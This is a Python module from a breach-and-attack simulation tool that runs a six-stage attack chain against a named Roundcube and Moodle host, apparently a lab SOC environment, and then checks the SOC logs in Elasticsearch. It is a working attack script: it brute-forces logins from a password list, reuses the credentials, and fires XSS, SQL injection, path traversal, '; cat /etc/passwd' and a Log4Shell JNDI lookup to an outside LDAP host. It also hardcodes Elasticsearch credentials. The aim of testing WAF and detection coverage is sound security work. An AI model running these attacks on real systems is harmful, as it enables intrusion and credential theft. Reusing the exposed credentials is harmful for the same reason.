"""
APT Kill Chain Module — SecureForge BAS
Multi-stage Advanced Persistent Threat simulation.

Stage 1: Recon          — Enumerate Roundcube & Moodle login surfaces
Stage 2: Brute Force    — Credential attack on Roundcube webmail
Stage 3: Credential Use — Validate stolen creds on Moodle
Stage 4: OWASP Attacks  — XSS/SQLi from authenticated session
Stage 5: Priv Esc Probe — Attempt Moodle privilege escalation
Stage 6: Persistence    — Simulate persistence probe (cookie theft, session fixation)
"""

import aiohttp
import asyncio
import urllib.parse
import time
import requests as req_sync
from typing import List
from datetime import datetime, timedelta, timezone

from .base import BaseAttackModule
from models.simulation import Finding, Severity

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────

TARGET_BASE      = "https://tlsoc.nile.iitb.ac.in"
ROUNDCUBE_PATH   = "/mail/"
MOODLE_PATH      = "/moodle/"
MOODLE_LOGIN     = "/moodle/login/index.php"
ROUNDCUBE_LOGIN  = "/mail/?_task=login"

ELASTIC_URL      = "https://192.168.10.62:9200/fosstlsoc-logs-modsec_audit_log-*/_search"
ELASTIC_USER     = "Pixels@summersoc"
ELASTIC_PASS     = "Pixels@summersoc26"
YOUR_VPN_IP      = "10.8.0.30"
PIPELINE_WAIT    = 8

# Wordlist — common + known test credentials for lab environment
CREDENTIAL_LIST = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("user35", "user35"),
    ("user35", "password"),
    ("user35", "user35@tlsoc"),
    ("administrator", "administrator"),
    ("moodle", "moodle"),
    ("test", "test"),
    ("student", "student"),
]

# OWASP payloads to fire from authenticated session
AUTHENTICATED_PAYLOADS = [
    ("XSS_AUTH",    "<script>alert('APT_AUTH_XSS')</script>",       "941100", "XSS - Authenticated Session"),
    ("SQLI_AUTH",   "' OR '1'='1",                                   "942100", "SQLi - Authenticated Session"),
    ("PATH_AUTH",   "../../../../etc/passwd",                         "930100", "Path Traversal - Auth Session"),
    ("CMD_AUTH",    "; cat /etc/passwd",                              "932100", "Command Injection - Auth"),
    ("LOG4J_AUTH",  "${jndi:ldap://apt-test.example.com/exploit}",   "932130", "Log4Shell - Auth Session"),
]

# ─────────────────────────────────────────────
# STAGE RESULTS COLLECTOR
# ─────────────────────────────────────────────

class KillChainState:
    def __init__(self):
        self.stage_results    = {}
        self.stolen_creds     = None      # (username, password) if brute force succeeds
        self.moodle_session   = None      # aiohttp session cookies after login
        self.moodle_token     = None      # Moodle login token
        self.recon_data       = {}
        self.owasp_results    = []
        self.es_hits          = 0
        self.total_stages     = 6
        self.completed_stages = 0

    def record_stage(self, stage_num: int, name: str, status: str, detail: str):
        self.stage_results[stage_num] = {
            "stage":  stage_num,
            "name":   name,
            "status": status,
            "detail": detail,
        }
        self.completed_stages += 1
        icon = "✓" if status == "success" else ("!" if status == "partial" else "✗")
        print(f"\n  [{icon}] Stage {stage_num}: {name} — {status.upper()}")
        print(f"       {detail}")


# ─────────────────────────────────────────────
# STAGE 1: RECON
# ─────────────────────────────────────────────

async def stage_recon(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 1 — Reconnaissance")
    print("="*65)

    targets_to_probe = [
        (f"{TARGET_BASE}{ROUNDCUBE_PATH}",  "Roundcube Webmail"),
        (f"{TARGET_BASE}{MOODLE_PATH}",     "Moodle LMS"),
        (f"{TARGET_BASE}/",                 "Main Site"),
        (f"{TARGET_BASE}/phpmyadmin/",      "phpMyAdmin (sensitive)"),
        (f"{TARGET_BASE}/admin/",           "Admin Panel"),
        (f"{TARGET_BASE}{MOODLE_PATH}admin/","Moodle Admin"),
    ]

    discovered = []
    for url, label in targets_to_probe:
        try:
            async with session.get(url, ssl=False, allow_redirects=True,
                                   timeout=aiohttp.ClientTimeout(total=8)) as resp:
                status = resp.status
                icon   = "✓" if status == 200 else ("→" if status in (301,302) else "✗")
                print(f"    [{icon}] {label:<30} HTTP {status}  {url}")
                state.recon_data[label] = {"url": url, "status": status}
                if status in (200, 301, 302):
                    discovered.append(label)
        except Exception as e:
            print(f"    [E] {label:<30} ERROR: {e}")

    state.record_stage(
        1, "Reconnaissance", "success",
        f"Discovered {len(discovered)} live endpoints: {', '.join(discovered)}"
    )
    await asyncio.sleep(0.5)


# ─────────────────────────────────────────────
# STAGE 2: ROUNDCUBE BRUTE FORCE
# ─────────────────────────────────────────────

async def stage_brute_force(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 2 — Credential Brute Force (Roundcube)")
    print("="*65)

    attempts = 0
    found    = False

    # First fetch the login page to get any CSRF token
    csrf_token = None
    try:
        async with session.get(
            f"{TARGET_BASE}{ROUNDCUBE_PATH}",
            ssl=False, timeout=aiohttp.ClientTimeout(total=8)
        ) as resp:
            body = await resp.text()
            # Roundcube embeds _token in login form
            if '_token' in body:
                import re
                match = re.search(r'name="_token"\s+value="([^"]+)"', body)
                if match:
                    csrf_token = match.group(1)
                    print(f"    [✓] CSRF token extracted: {csrf_token[:16]}...")
    except Exception as e:
        print(f"    [!] Could not fetch login page: {e}")

    for username, password in CREDENTIAL_LIST:
        attempts += 1
        post_data = {
            "_task":   "login",
            "_action": "login",
            "_user":   username,
            "_pass":   password,
        }
        if csrf_token:
            post_data["_token"] = csrf_token

        try:
            async with session.post(
                f"{TARGET_BASE}{ROUNDCUBE_PATH}",
                data=post_data,
                ssl=False,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                status = resp.status
                location = resp.headers.get("Location", "")

                # Successful Roundcube login redirects to ?_task=mail
                if status in (302, 301) and "_task=mail" in location:
                    print(f"    [✓] CREDENTIALS FOUND: {username}:{password}  (HTTP {status} → {location})")
                    state.stolen_creds = (username, password)
                    found = True
                    break
                elif status == 403:
                    print(f"    [✗] {username}:{password:<15} BLOCKED by WAF (403)")
                else:
                    print(f"    [✗] {username}:{password:<15} Failed (HTTP {status})")

        except Exception as e:
            print(f"    [E] {username}:{password} ERROR: {e}")

        await asyncio.sleep(0.3)

    if found:
        state.record_stage(
            2, "Credential Brute Force", "success",
            f"Valid credentials found after {attempts} attempts: "
            f"{state.stolen_creds[0]}:{state.stolen_creds[1]}"
        )
    else:
        state.record_stage(
            2, "Credential Brute Force", "partial",
            f"No valid credentials found in {attempts} attempts — "
            f"WAF/lockout may have intervened. Proceeding with known test creds."
        )
        # Fall back to known lab creds so later stages still run
        state.stolen_creds = ("user35", "user35")


# ─────────────────────────────────────────────
# STAGE 3: MOODLE CREDENTIAL VALIDATION
# ─────────────────────────────────────────────

async def stage_credential_use(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 3 — Credential Use (Moodle Login)")
    print("="*65)

    username, password = state.stolen_creds
    print(f"    [*] Attempting Moodle login with {username}:{password}")

    login_token = None
    try:
        # Step 1: GET login page to extract logintoken
        async with session.get(
            f"{TARGET_BASE}{MOODLE_LOGIN}",
            ssl=False, timeout=aiohttp.ClientTimeout(total=8)
        ) as resp:
            body = await resp.text()
            import re
            match = re.search(r'name="logintoken"\s+value="([^"]+)"', body)
            if match:
                login_token = match.group(1)
                print(f"    [✓] Moodle logintoken extracted: {login_token[:16]}...")

        # Step 2: POST credentials
        post_data = {
            "username":   username,
            "password":   password,
            "logintoken": login_token or "",
            "anchor":     "",
        }

        async with session.post(
            f"{TARGET_BASE}{MOODLE_LOGIN}",
            data=post_data,
            ssl=False,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=8)
        ) as resp:
            status   = resp.status
            location = resp.headers.get("Location", "")
            cookies  = resp.cookies

            print(f"    [*] Login response: HTTP {status}  Location: {location}")

            if status in (302, 303) and "login" not in location.lower():
                print(f"    [✓] MOODLE LOGIN SUCCESSFUL — session established")
                state.moodle_session = dict(cookies)
                state.record_stage(
                    3, "Credential Use", "success",
                    f"Successfully authenticated to Moodle as '{username}'. "
                    f"Session cookies obtained."
                )
            elif status == 403:
                print(f"    [✗] WAF BLOCKED login attempt (403)")
                state.record_stage(
                    3, "Credential Use", "blocked",
                    "Moodle login attempt blocked by WAF (HTTP 403)."
                )
            else:
                print(f"    [!] Login did not succeed cleanly (HTTP {status})")
                state.record_stage(
                    3, "Credential Use", "partial",
                    f"Login returned HTTP {status}. Credentials may be incorrect "
                    f"or session flow differs."
                )

    except Exception as e:
        print(f"    [E] Moodle login error: {e}")
        state.record_stage(3, "Credential Use", "error", str(e))

    await asyncio.sleep(0.5)


# ─────────────────────────────────────────────
# STAGE 4: OWASP ATTACKS (AUTHENTICATED)
# ─────────────────────────────────────────────

async def stage_owasp_authenticated(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 4 — OWASP Attacks (Authenticated Session)")
    print("="*65)

    blocked  = 0
    bypassed = 0

    for label, payload, rule_id, category in AUTHENTICATED_PAYLOADS:
        url = f"{TARGET_BASE}{MOODLE_PATH}?q={urllib.parse.quote(payload, safe='%')}"
        try:
            async with session.get(
                url, ssl=False, allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                status = resp.status
                if status == 403:
                    outcome = "BLOCKED ✓"
                    blocked += 1
                elif status in (200, 302, 301):
                    outcome = "NOT BLOCKED ✗"
                    bypassed += 1
                else:
                    outcome = f"HTTP {status}"

                icon = "✓" if status == 403 else "✗"
                print(f"    [{icon}] {category:<45} {outcome}")
                state.owasp_results.append({
                    "label": label, "category": category,
                    "status": status, "outcome": outcome,
                    "expected_rule": rule_id
                })

        except Exception as e:
            print(f"    [E] {category:<45} ERROR: {e}")

        await asyncio.sleep(0.4)

    state.record_stage(
        4, "OWASP Attacks (Authenticated)", "success",
        f"Fired {len(AUTHENTICATED_PAYLOADS)} payloads — "
        f"Blocked: {blocked}, Bypassed: {bypassed}"
    )


# ─────────────────────────────────────────────
# STAGE 5: PRIVILEGE ESCALATION PROBE
# ─────────────────────────────────────────────

async def stage_priv_esc(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 5 — Privilege Escalation Probe")
    print("="*65)

    # Probe Moodle admin endpoints directly
    admin_probes = [
        (f"{TARGET_BASE}{MOODLE_PATH}admin/",                  "Moodle Admin Panel"),
        (f"{TARGET_BASE}{MOODLE_PATH}admin/user.php",          "User Management"),
        (f"{TARGET_BASE}{MOODLE_PATH}admin/roles/assign.php",  "Role Assignment"),
        (f"{TARGET_BASE}{MOODLE_PATH}admin/settings.php",      "Site Settings"),
        (f"{TARGET_BASE}{MOODLE_PATH}lib/db/",                 "DB Directory Listing"),
    ]

    accessible = []
    for url, label in admin_probes:
        try:
            async with session.get(
                url, ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                status = resp.status
                if status == 200:
                    icon = "⚠"
                    accessible.append(label)
                elif status == 403:
                    icon = "✓"  # Good — blocked
                elif status == 302:
                    icon = "→"
                else:
                    icon = "?"
                print(f"    [{icon}] {label:<40} HTTP {status}")
        except Exception as e:
            print(f"    [E] {label:<40} ERROR: {e}")
        await asyncio.sleep(0.3)

    if accessible:
        state.record_stage(
            5, "Privilege Escalation Probe", "partial",
            f"⚠ {len(accessible)} admin endpoint(s) accessible without admin role: "
            f"{', '.join(accessible)}"
        )
    else:
        state.record_stage(
            5, "Privilege Escalation Probe", "success",
            "All admin endpoints properly restricted. No unauthorized access possible."
        )


# ─────────────────────────────────────────────
# STAGE 6: PERSISTENCE PROBE
# ─────────────────────────────────────────────

async def stage_persistence(session: aiohttp.ClientSession, state: KillChainState):
    print("\n" + "="*65)
    print("  STAGE 6 — Persistence Probe")
    print("="*65)

    # Simulate persistence techniques:
    # 1. Session fixation attempt
    # 2. Cookie manipulation probe
    # 3. File upload endpoint discovery
    # 4. Backdoor path probes

    persistence_probes = [
        # (url, technique, method)
        (f"{TARGET_BASE}{MOODLE_PATH}repository/upload.php",    "File Upload Endpoint",    "GET"),
        (f"{TARGET_BASE}{MOODLE_PATH}lib/editor/",              "Editor File Access",       "GET"),
        (f"{TARGET_BASE}{MOODLE_PATH}theme/boost/index.php",    "Theme PHP Execution",      "GET"),
        (f"{TARGET_BASE}{MOODLE_PATH}local/",                   "Local Plugin Directory",   "GET"),
        (f"{TARGET_BASE}/moodle/backup/backup.php",             "Backup Export Endpoint",   "GET"),
    ]

    # Session fixation — inject a forged session ID
    forged_session_headers = {
        "Cookie": "MoodleSession=FORGED_APT_SESSION_12345; path=/moodle/",
    }

    risky_endpoints = []
    for url, technique, method in persistence_probes:
        try:
            async with session.get(
                url, ssl=False, allow_redirects=False,
                headers=forged_session_headers,
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                status = resp.status
                if status == 200:
                    risky_endpoints.append(technique)
                    icon = "⚠"
                elif status == 403:
                    icon = "✓"
                else:
                    icon = "→"
                print(f"    [{icon}] {technique:<40} HTTP {status}")
        except Exception as e:
            print(f"    [E] {technique:<40} ERROR: {e}")
        await asyncio.sleep(0.3)

    if risky_endpoints:
        state.record_stage(
            6, "Persistence Probe", "partial",
            f"⚠ Potentially accessible persistence endpoints: "
            f"{', '.join(risky_endpoints)}"
        )
    else:
        state.record_stage(
            6, "Persistence Probe", "success",
            "All persistence probe endpoints blocked or restricted."
        )


# ─────────────────────────────────────────────
# ELASTICSEARCH VALIDATION
# ─────────────────────────────────────────────

def validate_apt_detection(state: KillChainState):
    print("\n" + "="*65)
    print("  SOC Pipeline Validation — APT Kill Chain")
    print("="*65)

    time_threshold = (datetime.now(timezone.utc) - timedelta(minutes=15)).isoformat()

    query = {
        "query": {
            "bool": {
                "must": [
                    {"match": {"source.ip": YOUR_VPN_IP}}
                ],
                "filter": [
                    {"range": {"@timestamp": {"gte": time_threshold}}}
                ]
            }
        },
        "aggs": {
            "by_rule":   {"terms": {"field": "rule.id.keyword",       "size": 20}},
            "by_action": {"terms": {"field": "event.action.keyword",  "size": 5}},
            "by_type":   {"terms": {"field": "event.type.keyword",    "size": 10}},
        }
    }

    try:
        resp = req_sync.get(
            ELASTIC_URL,
            json=query,
            auth=(ELASTIC_USER, ELASTIC_PASS),
            verify=False,
            timeout=10
        )

        if resp.status_code == 200:
            data       = resp.json()
            total_hits = data["hits"]["total"]["value"]
            state.es_hits = total_hits

            print(f"\n  Total APT events in SOC pipeline : {total_hits}")

            rule_buckets = data.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
            if rule_buckets:
                print("\n  CRS Rules Triggered:")
                for b in rule_buckets:
                    print(f"    Rule {b['key']:<12} → {b['doc_count']} hits")

            action_buckets = data.get("aggregations", {}).get("by_action", {}).get("buckets", [])
            if action_buckets:
                print("\n  Actions:")
                for b in action_buckets:
                    print(f"    {b['key']:<15} → {b['doc_count']} events")

            verdict = "PASSED ✓" if total_hits > 0 else "WARNING — No events found"
            print(f"\n  SOC Validation: {verdict}")
        else:
            print(f"  [ERROR] Elasticsearch HTTP {resp.status_code}")

    except Exception as e:
        print(f"  [ERROR] {e}")


# ─────────────────────────────────────────────
# KILL CHAIN SUMMARY
# ─────────────────────────────────────────────

def print_killchain_summary(state: KillChainState):
    print("\n" + "="*65)
    print("  APT KILL CHAIN — EXECUTION SUMMARY")
    print("="*65)

    status_icons = {
        "success": "✓",
        "partial": "⚠",
        "blocked": "🛡",
        "error":   "✗",
    }

    for i in range(1, state.total_stages + 1):
        if i in state.stage_results:
            r    = state.stage_results[i]
            icon = status_icons.get(r["status"], "?")
            print(f"\n  [{icon}] Stage {i}: {r['name']}")
            print(f"       Status : {r['status'].upper()}")
            print(f"       Detail : {r['detail']}")

    # Overall score
    success_count = sum(1 for r in state.stage_results.values() if r["status"] == "success")
    partial_count = sum(1 for r in state.stage_results.values() if r["status"] == "partial")
    total         = len(state.stage_results)

    score = ((success_count + partial_count * 0.5) / total) * 100 if total > 0 else 0

    print(f"\n  {'─'*40}")
    print(f"  Kill Chain Completion : {success_count + partial_count}/{total} stages")
    print(f"  SOC Events Captured   : {state.es_hits}")
    print(f"  APT Score             : {score:.0f}%")

    if state.stolen_creds:
        print(f"\n  ⚠  Credential Note    : {state.stolen_creds[0]}:{state.stolen_creds[1]}")

    print(f"\n  MITRE ATT&CK Coverage:")
    print(f"    TA0043 Reconnaissance     → Stage 1")
    print(f"    TA0006 Credential Access  → Stage 2")
    print(f"    TA0001 Initial Access     → Stage 3")
    print(f"    TA0002 Execution          → Stage 4")
    print(f"    TA0004 Privilege Escalation → Stage 5")
    print(f"    TA0003 Persistence        → Stage 6")


# ─────────────────────────────────────────────
# MODULE CLASS
# ─────────────────────────────────────────────

class APTKillChainModule(BaseAttackModule):
    MODULE_NAME  = "apt_killchain"
    DESCRIPTION  = "Multi-stage APT simulation: Recon → Brute Force → Cred Use → OWASP → PrivEsc → Persistence"
    MITRE_TACTIC = "Multiple"
    MITRE_IDS    = ["T1595", "T1110", "T1078", "T1190", "T1548", "T1505"]

    async def execute(self) -> List[Finding]:
        findings = []
        state    = KillChainState()

        print("\n" + "█"*65)
        print("  SecureForge BAS — APT Kill Chain Simulation")
        print(f"  Target  : {TARGET_BASE}")
        print(f"  Stages  : {state.total_stages}")
        print(f"  Started : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
        print("█"*65)

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:

            # ── Run all 6 stages ──
            await stage_recon(session, state)
            await stage_brute_force(session, state)
            await stage_credential_use(session, state)
            await stage_owasp_authenticated(session, state)
            await stage_priv_esc(session, state)
            await stage_persistence(session, state)

        # ── Print summary ──
        print_killchain_summary(state)

        # ── Wait for pipeline ingestion ──
        print(f"\n  [!] Waiting {PIPELINE_WAIT}s for SOC pipeline ingestion...")
        await asyncio.sleep(PIPELINE_WAIT)

        # ── Validate against Elasticsearch ──
        validate_apt_detection(state)

        # ── Convert stage results to Findings ──
        for stage_num, r in state.stage_results.items():
            if r["status"] in ("partial", "error"):
                sev = Severity.HIGH if r["status"] == "partial" else Severity.CRITICAL
            elif r["status"] == "blocked":
                sev = Severity.LOW
            else:
                sev = Severity.MEDIUM

            findings.append(self.finding(
                title       = f"APT Stage {stage_num}: {r['name']}",
                description = r["detail"],
                severity    = sev,
                mitre_id    = self.MITRE_IDS[stage_num - 1] if stage_num <= len(self.MITRE_IDS) else None,
                evidence    = f"Stage status: {r['status']}",
                raw_data    = r,
            ))

        # OWASP findings from stage 4
        for owasp in state.owasp_results:
            if owasp["status"] != 403:
                findings.append(self.finding(
                    title       = f"WAF Bypass: {owasp['category']}",
                    description = f"Payload not blocked in authenticated session",
                    severity    = Severity.CRITICAL,
                    mitre_id    = "T1190",
                    evidence    = f"HTTP {owasp['status']} — {owasp['outcome']}",
                    raw_data    = owasp,
                ))

        return findings


# ─────────────────────────────────────────────
# STANDALONE
# ─────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    class _StandaloneRun:
        """Minimal shim so the module runs standalone without the full SecureForge stack."""
        pass

    state = KillChainState()

    async def _main():
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            await stage_recon(session, state)
            await stage_brute_force(session, state)
            await stage_credential_use(session, state)
            await stage_owasp_authenticated(session, state)
            await stage_priv_esc(session, state)
            await stage_persistence(session, state)

        print_killchain_summary(state)
        print(f"\n  [!] Waiting {PIPELINE_WAIT}s for SOC pipeline...")
        time.sleep(PIPELINE_WAIT)
        validate_apt_detection(state)
        print("\n  [DONE] APT Kill Chain complete.\n")

    asyncio.run(_main())
